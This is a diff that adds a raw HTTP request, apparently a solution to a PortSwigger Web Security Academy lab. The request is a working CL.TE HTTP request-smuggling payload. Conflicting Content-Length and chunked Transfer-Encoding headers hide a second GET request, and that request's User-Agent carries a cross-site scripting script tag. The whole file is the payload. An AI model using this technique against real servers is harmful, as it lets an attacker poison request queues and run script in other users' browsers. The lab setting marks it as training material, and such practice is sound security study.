@@ -1,0 +1,14 @@
+POST / HTTP/1.1
+Host: ac9c1f8d1e144881807814b5002a0012.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 150
+Transfer-Encoding: chunked
+
+0
+
+GET /post?postId=5 HTTP/1.1
+User-Agent: a"/><script>alert(1)</script>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 5
+
+x=1
